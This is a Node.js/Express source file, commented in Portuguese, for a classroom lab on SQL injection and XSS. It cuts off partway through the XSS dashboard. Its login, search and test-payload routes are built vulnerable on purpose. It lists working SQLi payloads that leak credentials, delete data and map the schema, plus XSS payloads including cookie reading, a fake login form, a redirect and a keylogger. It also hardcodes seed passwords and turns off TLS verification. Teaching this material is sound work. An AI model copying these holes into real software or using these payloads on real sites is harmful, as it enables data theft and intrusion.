require('dotenv').config(); // 1º LUGAR OBRIGATÓRIO: Carrega as variáveis do arquivo .env antes de tudo!
const path = require('path');
const express = require('express');
const session = require('express-session');
const { Pool } = require('pg');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({
    secret: process.env.SESSION_SECRET || 'lab-idor-segredo-de-aula',
    resave: false,
    saveUninitialized: false,
    cookie: { maxAge: 8 * 60 * 60 * 1000 } // 8 horas, dura a aula inteira
}));
// Serve o CSS do design system e as páginas estáticas (sem dados do banco) em public/
app.use(express.static(path.join(__dirname, 'public')));

// Pega as peças separadas do .env (Locais)
const dbId = process.env.DB_ID;
const dbSenha = process.env.DB_SENHA;

// Monta a string final injetando as variáveis do jeito certo ou usa a variável nativa do Render se existir
const connectionString = process.env.DATABASE_URL || `postgresql://postgres.${dbId}:${dbSenha}@aws-1-us-west-2.pooler.supabase.com:6543/postgres?sslmode=require&uselibpqcompat=true`;

if (!connectionString || (!process.env.DATABASE_URL && (!dbId || !dbSenha))) {
  console.error("❌ ERRO: Configurações do banco de dados não encontradas no .env!");
  process.exit(1);
}

const pool = new Pool({
  connectionString: connectionString,
  ssl: {
    rejectUnauthorized: false // Obrigatório para o SSL do Supabase
  }
});

// Testar a conexão com o banco de dados na inicialização
pool.connect((err, client, release) => {
  if (err) {
    return console.error('❌ Erro crítico ao conectar no Supabase:', err.stack);
  }
  console.log('🚀 Sucesso: Conectado com segurança ao PostgreSQL do Supabase!');
  release();
});

// DADOS ORIGINAIS DO LABORATÓRIO (usados pelo botão de Reset para repor o banco)
const SEED_PRODUTOS = [
  { nome: 'Curso de QA Manual: Da Teoria ao Primeiro Bug', preco: 197.00, oculto: false },
  { nome: 'Curso de Automação com Cypress (Do Zero ao Pipeline)', preco: 297.00, oculto: false },
  { nome: 'Caneca de Porcelana: "Roda na Minha Máquina"', preco: 39.90, oculto: false },
  { nome: 'Café em Grãos Extra Forte para Devs (Pacote 1kg)', preco: 49.90, oculto: false },
  { nome: 'Gabarito Oficial da Prova de Engenharia de Software', preco: 999.00, oculto: true },
  { nome: 'Mouse Gamer Ergonômico com RGB (Mais 50 FPS de Código)', preco: 159.90, oculto: false },
  { nome: 'Teclado Mecânico Switch Blue (Para irritar o pessoal do lado)', preco: 249.90, oculto: false },
  { nome: 'E-book: 101 Desculpas Padrão para Quando o Sistema Cai', preco: 19.90, oculto: false },
  { nome: 'Acesso de Administrador Root no Servidor de Produção', preco: 9999.00, oculto: true },
  { nome: 'Licença Anual Individual - IntelliJ IDEA Pro', preco: 349.00, oculto: false },
  { nome: 'Monitor Ultrawide 34 Pol (Para ver logs gigantes sem dar scroll)', preco: 1899.00, oculto: false },
  { nome: 'Camiseta: "Fiz o Commit na Sexta-Feira às 17h59"', preco: 59.90, oculto: false },
  { nome: 'Script em Python que automatiza 90% do seu trabalho diário', preco: 79.90, oculto: false },
  { nome: 'Planilha com todos os salários e cargos da diretoria da empresa', preco: 4999.00, oculto: true },
  { nome: 'Hub USB-C 8 em 1 (Para aguentar todos os adaptadores do Mac)', preco: 89.90, oculto: false },
  { nome: 'Livro Físico: Clean Code (Para deixar na mesa e fingir que leu)', preco: 99.90, oculto: false },
  { nome: 'Almofada Ergonômica para Cadeira de Escritório (Adeus dor nas costas)', preco: 129.90, oculto: false },
  { nome: 'Backup Completo do Banco de Dados de Produção (.sql de 50GB)', preco: 14999.00, oculto: true },
  { nome: 'Garrafa Térmica Inteligente com Mostrador de Temperatura (500ml)', preco: 69.90, oculto: false },
  { nome: 'Curso Avançado: Engenharia de Prompt para Alavancar Carreira', preco: 397.00, oculto: false },
  { nome: 'Produto Normal', preco: 29.90, oculto: false },
  { nome: 'Produto Secreto', preco: 1999.00, oculto: true }
];

const SEED_USUARIOS = [
  { email: 'admin@nosso-lab.com', senha: 'SenhaSuperSecreta123', perfil: 'admin' },
  { email: 'admin@lab.com', senha: '123456', perfil: 'admin' },
  { email: 'user@lab.com', senha: 'senha', perfil: 'user' }
];

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

// 0. HUB DE SELEÇÃO DE LABORATÓRIOS — página estática, ver public/hub.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'hub.html'));
});

// 1. TELA DE LOGIN — página estática, ver public/sqli-login.html
//    (o pré-preenchimento do e-mail via ?email= agora é feito no próprio HTML, no navegador)
app.get('/sqli', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'sqli-login.html'));
});

// 2. ROTA DE LOGIN VULNERÁVEL (Ataque de desvio/Bypass)
app.post('/login', async (req, res) => {
    const { email, senha } = req.body;

    // O ERRO INTENCIONAL: Interpolação direta que permite fechar a aspa e anular a query.
    // IMPORTANTE: "senha" vem ANTES de "email" de propósito. Em SQL, AND tem precedência
    // maior que OR — então com email='\' OR \'1\'=\'1' e senha em qualquer ordem ANTERIOR,
    // a expressão fica "(senha=X AND email=Y) OR '1'='1'", e o "OR '1'='1'" sozinho no final
    // já basta para bypassar o login, mesmo sem comentar o resto da query com "--".
    // Se "email" viesse primeiro, ficaria "email=Y OR ('1'='1' AND senha=X)" e o bypass
    // simples não funcionaria sem o "--" (foi exatamente o bug que os alunos notaram).
    const query = `SELECT * FROM usuarios WHERE senha = '${senha}' AND email = '${email}'`;

    console.log(`\n🔍 Query executada no banco:\n${query}\n`);

    try {
        const resultado = await pool.query(query);

        if (resultado.rows.length > 0) {
            // Redireciona para o dashboard ao invés de mostrar apenas "BINGO"
            res.send(`
                <div style="font-family: sans-serif; text-align:center; margin-top:100px;">
                    <h1 style="color: green;">🔓 BINGO! Autenticação Ignorada!</h1>
                    <p style="font-size: 18px;">Logado como: <strong>${resultado.rows[0].email}</strong></p>
                    <p style="font-size: 18px;">Perfil no Sistema: <strong>${resultado.rows[0].perfil}</strong></p>
                    <br>
                    <a href="/dashboard" style="padding:12px 25px; background:#28a745; color:white; text-decoration:none; border-radius:4px; font-weight:bold;">🛒 Ir para a Loja</a>
                    <a href="/sqli" style="padding:12px 25px; margin-left:10px; background:#6c757d; color:white; text-decoration:none; border-radius:4px;">Voltar</a>
                </div>
            `);
        } else {
            res.send(`
                <div style="font-family: sans-serif; text-align:center; margin-top:100px;">
                    <h1 style="color: red;">❌ Erro de Autenticação</h1>
                    <p style="font-size: 18px;">Usuário ou senha inválidos.</p>
                    <br>
                    <a href="/sqli" style="padding:10px 20px; background:#007bff; color:white; text-decoration:none; border-radius:4px;">Tentar novamente</a>
                </div>
            `);
        }
    } catch (error) {
        res.status(500).send(`
            <div style="font-family: monospace; background:#f8d7da; padding:30px; margin:50px auto; max-width: 800px; border-radius:8px; border: 1px solid #f5c6cb;">
                <h3 style="color: #721c24; margin-top:0;">💥 Banco de Dados Quebrou! (Erro de Sintaxe SQL)</h3>
                <p><strong>Mensagem do Postgres:</strong> <span style="color:red;">${error.message}</span></p>
                <p><strong>Query que causou o erro:</strong></p>
                <pre style="background:#fff; padding:15px; border:1px solid #ddd; overflow-x:auto;"><code>${query}</code></pre>
                <br>
                <a href="/sqli" style="padding:10px 20px; background:#721c24; color:white; text-decoration:none; border-radius:4px;">Voltar</a>
            </div>
        `);
    }
});

// 3. DASHBOARD COM MENU LATERAL DE 10 TESTES SQLi (acordeão: clicar abre/fecha sem recarregar a página)
const testes = [
    { id: 'test1', nome: '1️⃣ Error-based Injection', payload: "' AND 1=CAST((SELECT string_agg(email||':'||senha, ', ') FROM usuarios) AS INT)--", descricao: 'Vaza dados através da mensagem de erro do banco' },
    { id: 'test2', nome: '2️⃣ UNION SELECT', payload: "' UNION SELECT id, email || ':' || senha, 0, false FROM usuarios--", descricao: 'Extrai dados de outra tabela' },
    { id: 'test3', nome: '3️⃣ ORDER BY', payload: "' ORDER BY 4--", descricao: 'Descobre número de colunas' },
    { id: 'test4', nome: '4️⃣ Comentários', payload: "%' OR oculto=true--", descricao: 'Ignora o resto do filtro' },
    { id: 'test5', nome: '5️⃣ Stacked Queries', payload: "'; DELETE FROM produtos WHERE oculto=true;--", descricao: 'Executa múltiplas queries' },
    { id: 'test6', nome: '6️⃣ Time-based Blind', payload: "' AND 1=(SELECT 1 FROM pg_sleep(3))--", descricao: 'Extrai informação por tempo de resposta' },
    { id: 'test7', nome: '7️⃣ Boolean Blind', payload: "' AND 1=1--", descricao: 'Anula o filtro com uma condição sempre verdadeira' },
    { id: 'test8', nome: '8️⃣ DELETE Injection', payload: "'; DELETE FROM produtos WHERE id>0;--", descricao: 'Deleta dados da tabela' },
    { id: 'test9', nome: '9️⃣ UPDATE Injection', payload: "'; UPDATE produtos SET preco=0;--", descricao: 'Modifica dados da tabela' },
    { id: 'test10', nome: '🔟 Information Schema', payload: "' UNION SELECT 1, table_name || '.' || column_name, 1, false FROM information_schema.columns WHERE table_schema='public'--", descricao: 'Mapeia a estrutura do banco' }
];

app.get('/dashboard', async (req, res) => {
    // Buscar todos os produtos (sem filtro)
    let produtosHtml = '';
    try {
        const resultado = await pool.query('SELECT * FROM produtos ORDER BY id');
        resultado.rows.forEach(prod => {
            const estiloLinha = prod.oculto ? 'background: #fff3cd;' : '';
            const statusOculto = prod.oculto ? '🔒 OCULTO' : '✅ Visível';
            produtosHtml += `
                <tr style="${estiloLinha}">
                    <td style="padding:12px; border:1px solid #ddd;">${prod.nome}</td>
                    <td style="padding:12px; border:1px solid #ddd;">R$ ${prod.preco}</td>
                    <td style="padding:12px; border:1px solid #ddd; text-align:center;">${statusOculto}</td>
                </tr>
            `;
        });
    } catch (e) {
        produtosHtml = `<tr><td colspan="3" style="padding:20px; text-align:center; color:#d9534f;">❌ Erro ao carregar: ${e.message}</td></tr>`;
    }

    // Gerar menu lateral em acordeão: cada item tem um painel (rolldown) que abre embaixo dele
    let menu = '';
    testes.forEach(teste => {
        const payloadHtml = escapeHtml(teste.payload);

        let aviso = '';
        if (teste.id === 'test5' || teste.id === 'test8' || teste.id === 'test9') {
            aviso = '<div style="background:#f8d7da; border-left:4px solid #dc3545; padding:10px; margin-bottom:10px; border-radius:4px; color:#721c24; font-size:12px;"><strong>⚠️ Atenção:</strong> Este teste altera os dados do banco para TODOS os alunos. Depois de testar, favor apertar o botão "🔄 Resetar Dados do Laboratório" para colocar os itens novamente.</div>';
        }

        menu += `
            <div class="teste-item">
                <a href="javascript:void(0)" class="teste-link" id="link-${teste.id}" onclick="toggleTeste('${teste.id}')">
                    <strong style="font-size:13px;">${teste.nome}</strong><br>
                    <small style="opacity:0.7; font-size:11px;">${teste.descricao}</small>
                </a>
                <div class="teste-panel" id="panel-${teste.id}">
                    ${aviso}
                    <p style="margin:6px 0; color:#004085; font-size:12px;"><strong>Payload:</strong></p>
                    <code style="background:white; padding:8px; border-radius:4px; display:block; word-break:break-all; font-size:11px; border:1px solid #0056b3;">${payloadHtml}</code>
                    <p style="margin:8px 0 0 0; color:#856404; font-size:11px;">✋ Cole isso no campo de busca, ao lado, e clique em "Buscar".</p>
                </div>
            </div>
        `;
    });

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Laboratório SQLi - Dashboard</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { font-family: sans-serif; background: white; }
                .container { display: flex; height: 100vh; }
                .sidebar { width: 280px; background: #f5f5f5; padding: 20px; overflow-y: auto; border-right: 2px solid #ddd; }
                .main { flex: 1; padding: 30px; overflow-y: auto; background: white; }
                .sidebar h2 { margin-top: 0; margin-bottom: 10px; color: #333; font-size: 16px; }
                .sidebar p { font-size: 12px; color: #666; margin-bottom: 15px; }
                .teste-item { margin: 8px 0; }
                .teste-link { display:block; padding:12px; border-radius:4px; text-decoration:none; background:#f9f9f9; border:1px solid #ddd; color:#333; cursor:pointer; transition:all 0.2s; }
                .teste-link.active { background:#007bff; color:white; border:2px solid #0056b3; }
                .teste-panel { display:none; background:#e7f3ff; padding:12px; border-radius:4px; margin-top:6px; border-left:4px solid #007bff; }
                .teste-panel.open { display:block; }
                .reset-btn { display:block; width:100%; text-align:center; padding:12px; background:#fd7e14; color:white; border:none; border-radius:4px; margin-top:20px; font-weight:bold; cursor:pointer; font-size:13px; }
                .search-area { margin-bottom: 25px; }
                .search-area input { width: 100%; padding: 12px; border: 2px solid #007bff; border-radius: 4px; font-size: 14px; }
                .search-area button { width: 100%; padding: 10px; margin-top: 10px; background: #28a745; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
                .products-table { width: 100%; border-collapse: collapse; margin-top: 10px; }
                .products-table th { background: #f2f2f2; padding: 12px; border: 1px solid #ddd; text-align: left; font-weight: bold; }
                .products-table td { padding: 12px; border: 1px solid #ddd; }
                .logout { display: block; text-align: center; padding: 10px; background: #dc3545; color: white; text-decoration: none; border-radius: 4px; margin-top: 10px; }
            </style>
        </head>
        <body>
            <div class="container">
                <!-- SIDEBAR -->
                <div class="sidebar">
                    <h2>🔬 10 Testes SQLi</h2>
                    <p>Clique em um teste para ver o payload (abre embaixo do item, fechando o anterior)</p>
                    ${menu}
                    <button class="reset-btn" onclick="resetarDados()">🔄 Resetar Dados do Laboratório</button>
                    <a href="/sqli" class="logout">🚪 Logout</a>
                </div>

                <!-- MAIN CONTENT -->
                <div class="main">
                    <h1 style="margin-bottom: 20px; color: #333;">🛒 Loja de Produtos</h1>

                    <!-- CAMPO DE BUSCA -->
                    <div class="search-area">
                        <input type="text" id="busca" placeholder="Digite aqui para buscar produtos... ou insira um payload SQLi!" value="">
                        <button onclick="buscarProdutos()">🔍 Buscar</button>
                    </div>

                    <!-- TABELA DE PRODUTOS -->
                    <table class="products-table">
                        <thead>
                            <tr>
                                <th>Produto</th>
                                <th>Preço</th>
                                <th>Status</th>
                            </tr>
                        </thead>
                        <tbody id="produtos">
                            ${produtosHtml}
                        </tbody>
                    </table>
                </div>
            </div>

            <script>
            let testeAberto = null;

            function toggleTeste(id) {
                const painelNovo = document.getElementById('panel-' + id);
                const linkNovo = document.getElementById('link-' + id);
                const reabrindoMesmo = testeAberto === id;

                if (testeAberto) {
                    document.getElementById('panel-' + testeAberto).classList.remove('open');
                    document.getElementById('link-' + testeAberto).classList.remove('active');
                }

                if (reabrindoMesmo) {
                    testeAberto = null;
                } else {
                    painelNovo.classList.add('open');
                    linkNovo.classList.add('active');
                    testeAberto = id;
                }
            }

            async function executarBusca(payload) {
                try {
                    const response = await fetch('/test-payload', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ payload: payload })
                    });

                    const resultado = await response.json();
                    let html = '';

                    if (resultado.sucesso) {
                        if (resultado.dados.length === 0) {
                            html = '<tr><td colspan="3" style="text-align:center; padding:20px; color:#999;">Nenhum resultado encontrado</td></tr>';
                        } else {
                            resultado.dados.forEach(prod => {
                                const estiloLinha = prod.oculto ? 'background: #fff3cd;' : '';
                                const statusOculto = prod.oculto ? '🔒 OCULTO' : '✅ Visível';
                                html += '<tr style="' + estiloLinha + '">' +
                                        '<td>' + prod.nome + '</td>' +
                                        '<td>R$ ' + prod.preco + '</td>' +
                                        '<td style="text-align:center;">' + statusOculto + '</td>' +
                                        '</tr>';
                            });
                        }
                    } else {
                        html = '<tr><td colspan="3" style="padding:20px;"><div style="background:#f8d7da; color:#721c24; padding:10px; border-radius:4px;"><strong>💥 Erro SQL:</strong> ' + resultado.erro + '<br><small>Query: ' + resultado.query + '</small></div></td></tr>';
                    }

                    document.getElementById('produtos').innerHTML = html;
                } catch (err) {
                    document.getElementById('produtos').innerHTML = '<tr><td colspan="3" style="padding:20px; color:#d9534f;">❌ Erro: ' + err.message + '</td></tr>';
                }
            }

            function buscarProdutos() {
                executarBusca(document.getElementById('busca').value);
            }

            async function resetarDados() {
                if (!confirm('⚠️ Isso vai restaurar produtos e usuários para os dados originais, afetando TODOS os alunos conectados agora. Continuar?')) {
                    return;
                }
                try {
                    const response = await fetch('/reset', { method: 'POST' });
                    const resultado = await response.json();
                    alert(resultado.mensagem || resultado.erro);
                    document.getElementById('busca').value = '';
                    executarBusca('');
                } catch (err) {
                    alert('❌ Erro ao resetar: ' + err.message);
                }
            }
            </script>
        </body>
        </html>
    `);
});

// 4. ROTA DE TESTE INTERATIVO (Para executar payloads na dashboard)
app.post('/test-payload', async (req, res) => {
    const { payload } = req.body;

    if (payload === undefined || payload === null) {
        return res.json({ sucesso: false, erro: 'Payload é obrigatório', query: '' });
    }

    // O ERRO INTENCIONAL: Concatenação direta sem sanitização
    const query = `SELECT * FROM produtos WHERE nome LIKE '%${payload}%' AND oculto = false`;

    try {
        let resultado = await pool.query(query);

        // Quando o payload injeta múltiplas instruções (stacked queries), o driver
        // retorna um array com um resultado por instrução: usamos o último.
        if (Array.isArray(resultado)) {
            resultado = resultado[resultado.length - 1];
        }

        res.json({
            sucesso: true,
            query: query,
            linhas: resultado.rowCount,
            dados: (resultado.rows || []).slice(0, 10) // Limitar a 10 linhas
        });
    } catch (error) {
        res.json({
            sucesso: false,
            query: query,
            erro: error.message,
            dica: '💡 Erro de sintaxe SQL - Pode ser que o payload funcionou!'
        });
    }
});

// 5. ROTA PARA RESETAR OS DADOS DO LABORATÓRIO (restaura produtos e usuários originais)
app.post('/reset', async (req, res) => {
    const client = await pool.connect();
    try {
        await client.query('BEGIN');

        await client.query('DELETE FROM produtos');
        await client.query('ALTER SEQUENCE produtos_id_seq RESTART WITH 1');
        for (const p of SEED_PRODUTOS) {
            await client.query('INSERT INTO produtos (nome, preco, oculto) VALUES ($1, $2, $3)', [p.nome, p.preco, p.oculto]);
        }

        await client.query('DELETE FROM usuarios');
        await client.query('ALTER SEQUENCE usuarios_id_seq RESTART WITH 1');
        for (const u of SEED_USUARIOS) {
            await client.query('INSERT INTO usuarios (email, senha, perfil) VALUES ($1, $2, $3)', [u.email, u.senha, u.perfil]);
        }

        await client.query('COMMIT');
        res.json({ sucesso: true, mensagem: '✅ Dados resetados com sucesso! Produtos e usuários voltaram ao estado original.' });
    } catch (error) {
        await client.query('ROLLBACK');
        res.status(500).json({ sucesso: false, erro: error.message });
    } finally {
        client.release();
    }
});

// 6. ROTA DE BUSCA VULNERÁVEL (Ataque para extrair dados/exibir ocultos)

app.get('/produtos', async (req, res) => {
    const termoBusca = req.query.busca || '';

    // O ERRO INTENCIONAL: Concatenação sem sanitização anulando a lógica do "oculto = false"
    const query = `SELECT * FROM produtos WHERE nome LIKE '%${termoBusca}%' AND oculto = false`;

    console.log(`\n🔍 Query de Busca executada:\n${query}\n`);

    try {
        const resultado = await pool.query(query);

        let linhasTabela = '';
        resultado.rows.forEach(prod => {
            const estiloLinha = prod.oculto ? 'background: #fff3cd; font-weight: bold;' : '';
            linhasTabela += `
                <tr style="${estiloLinha}">
                    <td style="padding:10px; border:1px solid #ddd;">${prod.nome}</td>
                    <td style="padding:10px; border:1px solid #ddd;">R$ ${prod.preco}</td>
                    <td style="padding:10px; border:1px solid #ddd; color: ${prod.oculto ? 'red' : 'green'};">${prod.oculto ? '⚠️ SIM (CONFIDENCIAL)' : 'Não'}</td>
                </tr>
            `;
        });

        res.send(`
            <div style="font-family: sans-serif; max-width: 900px; margin: 40px auto; padding: 20px;">
                <h2>E-Commerce do Lab - Busca de Produtos</h2>
                <p style="color:#666;">O sistema esconde os produtos ocultos da diretoria automaticamente... Será?</p>

                <form action="/produtos" method="GET" style="margin-bottom: 20px; display: flex; gap: 10px;">
                    <input type="text" name="busca" value="${termoBusca}" style="flex: 1; padding:12px; border: 1px solid #ccc; border-radius:4px;" placeholder="Pesquisar produto no catálogo...">
                    <button type="submit" style="padding:12px 25px; background:#28a745; color:white; border:none; border-radius:4px; font-weight:bold; cursor:pointer;">Buscar</button>
                </form>

                <table style="width:100%; border-collapse: collapse; box-shadow: 0 2px 4px rgba(0,0,0,0.05);">
                    <thead>
                        <tr style="background:#f2f2f2; border-bottom: 2px solid #ddd;">
                            <th style="padding:12px; border:1px solid #ddd; text-align:left;">Nome do Produto</th>
                            <th style="padding:12px; border:1px solid #ddd; text-align:left;">Preço</th>
                            <th style="padding:12px; border:1px solid #ddd; text-align:left;">Restrito/Oculto?</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${linhasTabela || '<tr><td colspan="3" style="padding:20px; text-align:center; color:#999;">Nenhum produto encontrado.</td></tr>'}
                    </tbody>
                </table>
                <br>
                <a href="/sqli" style="color:#007bff; text-decoration:none;">← Voltar para o Login</a>
            </div>
        `);
    } catch (error) {
        res.status(500).send(`
            <div style="font-family: monospace; background:#f8d7da; padding:30px; margin:50px auto; max-width: 800px; border-radius:8px; border: 1px solid #f5c6cb;">
                <h3 style="color: #721c24; margin-top:0;">💥 Erro de Sintaxe SQL na Busca!</h3>
                <p><strong>Mensagem do Postgres:</strong> <span style="color:red;">${error.message}</span></p>
                <p><strong>Query que causou o erro:</strong></p>
                <pre style="background:#fff; padding:15px; border:1px solid #ddd; overflow-x:auto;"><code>${query}</code></pre>
                <br>
                <a href="/produtos" style="padding:10px 20px; background:#721c24; color:white; text-decoration:none; border-radius:4px;">Voltar</a>
            </div>
        `);
    }
});

// ============================================================
// LABORATÓRIO DE XSS (Cross-Site Scripting)
// ============================================================

const SEED_COMENTARIOS = [
    { autor: 'Professor', mensagem: 'Bem-vindo ao Mural do Laboratório! Use os payloads da barra lateral para testar o XSS Armazenado aqui. 🔬' },
    { autor: 'Aluno Teste', mensagem: 'Esse curso está muito bom, aprendendo bastante sobre segurança!' }
];

// 10 testes de XSS para a barra lateral (acordeão, igual ao lab de SQLi)
// As mensagens dos alerts explicam, em português simples, o que NÃO deveria ter acontecido —
// pensado para QAs que não programam, não só para quem já conhece o ataque.
const testesXss = [
    { id: 'xss1', nome: '1️⃣ Alert Básico', payload: `<script>alert('Este código não deveria ser possível executar')</script>`, onde: 'Busca e Mural', descricao: 'Se a caixinha de aviso aparecer na tela, o site está executando código que você digitou como se fosse parte do próprio sistema' },
    { id: 'xss2', nome: '2️⃣ Exibir Cookies', payload: `<script>alert('Um invasor poderia ter roubado os dados da sua sessão: ' + document.cookie)</script>`, onde: 'Busca e Mural', descricao: 'Mostra que, além de exibir um aviso, o código injetado também consegue ler informações sensíveis guardadas no navegador' },
    { id: 'xss3', nome: '3️⃣ Manipulação de DOM (Título)', payload: `<script>document.title = 'PÁGINA ALTERADA - isso não deveria ser possível'</script>`, onde: 'Busca e Mural', descricao: 'Repare no título da aba do navegador: ele muda sozinho, sem nenhum aviso, provando que o código alterou a página por dentro' },
    { id: 'xss4', nome: '4️⃣ Defacement da Página', payload: `<script>document.body.innerHTML = '<h1 style=\"color:red;text-align:center;margin-top:100px;\">Esta página foi totalmente substituída por um script - isso não deveria ser possível</h1>'</script>`, onde: 'Mural', descricao: 'Mostra o pior cenário: o conteúdo inteiro da página é apagado e trocado por outra coisa, sem o usuário perceber a troca' },
    { id: 'xss5', nome: '5️⃣ Caixa de Login Falsa (Phishing)', payload: `<script>document.body.innerHTML = '<div style="text-align:center;margin-top:100px;font-family:sans-serif;"><h2>⚠️ Atenção: este formulário foi inserido por um script. Nunca digite uma senha real aqui!</h2><form><input placeholder="Email" style="padding:10px;display:block;margin:10px auto;width:250px;"><input placeholder="Senha" type="password" style="padding:10px;display:block;margin:10px auto;width:250px;"><button style="padding:10px 20px;">Entrar</button></form></div>'</script>`, onde: 'Mural', descricao: 'Simula um golpe real: um formulário de login falso aparece dentro do site verdadeiro, pronto para capturar a senha de quem confiar nele' },
    { id: 'xss6', nome: '6️⃣ IMG com onerror (sem <script>)', payload: `<img src="x" onerror="alert('Este script foi escondido dentro de uma imagem e mesmo assim foi executado - isso não deveria ser possível')">`, onde: 'Busca e Mural', descricao: 'Prova que bloquear só a palavra "script" não resolve: dá para esconder o ataque dentro de outras tags, como uma imagem' },
    { id: 'xss7', nome: '7️⃣ SVG com onload', payload: `<svg onload="alert('Este script foi escondido dentro de um desenho SVG e mesmo assim foi executado - isso não deveria ser possível')"></svg>`, onde: 'Busca e Mural', descricao: 'Outro exemplo de código escondido em uma tag que parece inofensiva (um desenho/ícone), reforçando que filtros simples não bastam' },
    { id: 'xss8', nome: '8️⃣ Redirecionamento Malicioso', payload: `<script>alert('Você está prestes a ser redirecionado para um site diferente, sem ter clicado em nada - isso não deveria ser possível'); window.location='https://exemplo.com'</script>`, onde: 'Mural', descricao: 'Mostra que o código injetado pode mandar a vítima para outro endereço (um site falso de phishing, por exemplo) sem ela pedir isso' },
    { id: 'xss9', nome: '9️⃣ Div com Evento onmouseover', payload: `<div onmouseover="alert('Você só passou o mouse aqui e um script foi executado - isso não deveria ser possível')" style="background:#ffeb3b;padding:20px;">Passe o mouse sobre esta caixa amarela</div>`, onde: 'Mural', descricao: 'Mostra que o ataque nem sempre precisa de clique: passar o mouse por cima de uma área já é suficiente para disparar o código' },
    { id: 'xss10', nome: '🔟 Keylogger Simples', payload: `<script>alert('A partir de agora, tudo o que você digitar nesta página será registrado em segredo - isso não deveria ser possível'); document.onkeypress = function(e){ console.log('Tecla digitada capturada pelo invasor: ' + e.key); var painel = document.getElementById('monitor-log'); if (painel) { var linha = document.createElement('div'); linha.textContent = '> tecla capturada: ' + e.key; painel.appendChild(linha); painel.scrollTop = painel.scrollHeight; } }</script>`, onde: 'Mural', descricao: 'O caso mais perigoso: o código fica "espionando" o teclado de quem visitar o mural depois. Veja o Painel de Monitoramento ao lado do formulário (ele só se ativa depois que este payload for publicado em algum comentário)' }
];

function renderMenuXss() {
    let menu = '';
    testesXss.forEach(teste => {
        const payloadHtml = escapeHtml(teste.payload);
        const nomeHtml = escapeHtml(teste.nome);
        const descricaoHtml = escapeHtml(teste.descricao);
        menu += `
            <div class="teste-item">
                <a href="javascript:void(0)" class="teste-link" id="link-${teste.id}" onclick="toggleTesteXss('${teste.id}')">
                    <strong style="font-size:13px;">${nomeHtml}</strong><br>
                    <small style="opacity:0.7; font-size:11px;">${descricaoHtml}</small>
                </a>
                <div class="teste-panel" id="panel-${teste.id}">
                    <p style="margin:6px 0; color:#155724; font-size:12px;"><strong>Onde testar:</strong> ${teste.onde}</p>
                    <code style="background:white; padding:8px; border-radius:4px; display:block; word-break:break-all; font-size:11px; border:1px solid #28a745; white-space:pre-wrap;">${payloadHtml}</code>
                    <p style="margin:8px 0 0 0; color:#856404; font-size:11px;">✋ Copie e cole na busca ou no campo de mensagem do mural.</p>
                </div>
            </div>
        `;
    });
    return menu;
}

const sidebarStyleXss = `
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: sans-serif; background: white; }
    .container { display: flex; min-height: 100vh; }
    .sidebar { width: 300px; background: #f5f5f5; padding: 20px; overflow-y: auto; border-right: 2px solid #ddd; }
    .main { flex: 1; padding: 30px; overflow-y: auto; background: white; }
    .sidebar h2 { margin-top: 0; margin-bottom: 10px; color: #333; font-size: 16px; }
    .sidebar p { font-size: 12px; color: #666; margin-bottom: 15px; }
    .teste-item { margin: 8px 0; }
    .teste-link { display:block; padding:12px; border-radius:4px; text-decoration:none; background:#f9f9f9; border:1px solid #ddd; color:#333; cursor:pointer; transition:all 0.2s; }
    .teste-link.active { background:#28a745; color:white; border:2px solid #1e7e34; }
    .teste-panel { display:none; background:#e9f7ef; padding:12px; border-radius:4px; margin-top:6px; border-left:4px solid #28a745; }
    .teste-panel.open { display:block; }
    .reset-btn { display:block; width:100%; text-align:center; padding:12px; background:#fd7e14; color:white; border:none; border-radius:4px; margin-top:20px; font-weight:bold; cursor:pointer; font-size:13px; text-decoration: none; }
    .nav-link { display:block; text-align:center; padding:10px; background:#6c757d; color:white; text-decoration:none; border-radius:4px; margin-top:10px; font-size: 13px; }
`;

const scriptAccordionXss = `
    let testeAbertoXss = null;
    function toggleTesteXss(id) {
        const painelNovo = document.getElementById('panel-' + id);
        const linkNovo = document.getElementById('link-' + id);
        const reabrindoMesmo = testeAbertoXss === id;

        if (testeAbertoXss) {
            document.getElementById('panel-' + testeAbertoXss).classList.remove('open');
            document.getElementById('link-' + testeAbertoXss).classList.remove('active');
        }

        if (reabrindoMesmo) {
            testeAbertoXss = null;
        } else {
            painelNovo.classList.add('open');
            linkNovo.classList.add('active');
            testeAbertoXss = id;
        }
    }

    async function resetarMural(sala) {
        if (!confirm('⚠️ Isso vai restaurar o mural do Lab ' + sala + ' e também o catálogo de produtos (usado por TODOS os alunos, inclusive no lab de SQLi). Continuar?')) {
            return;
        }
        try {
            const response = await fetch('/xss/' + sala + '/reset', { method: 'POST' });
            const resultado = await response.json();
            alert(resultado.mensagem || resultado.erro);
            window.location.reload();
        } catch (err) {
            alert('❌ Erro ao resetar: ' + err.message);
        }
    }
`;

// Garante que só existem as salas 1 e 2 (evita acessar /xss/<qualquer-coisa> como rota válida)
app.param('sala', (req, res, next, sala) => {
    if (sala !== '1' && sala !== '2') {
        return res.status(404).send('Sala de laboratório inválida. Use /xss/1 ou /xss/2.');
    }
    next();
});

// 0. SELEÇÃO DE SALA (Lab 1 / Lab 2) — cada sala tem seu próprio mural, isolado uma da outra
// SELEÇÃO DE SALA (Lab 1 / Lab 2) — página estática, ver public/xss-sala.html
app.get('/xss', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'xss-sala.html'));
});

// 1. DASHBOARD DO LAB DE XSS (menu lateral com os 10 testes + acesso às 2 rotas vulneráveis, isolado por sala)
app.get('/xss/:sala', (req, res) => {
    const { sala } = req.params;
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Laboratório XSS - Lab ${sala}</title>
            <style>${sidebarStyleXss}</style>
        </head>
        <body>
            <div class="container">
                <div class="sidebar">
                    <h2>🧪 10 Testes XSS</h2>
                    <p>Clique em um teste para ver o payload (abre embaixo do item, fechando o anterior)</p>
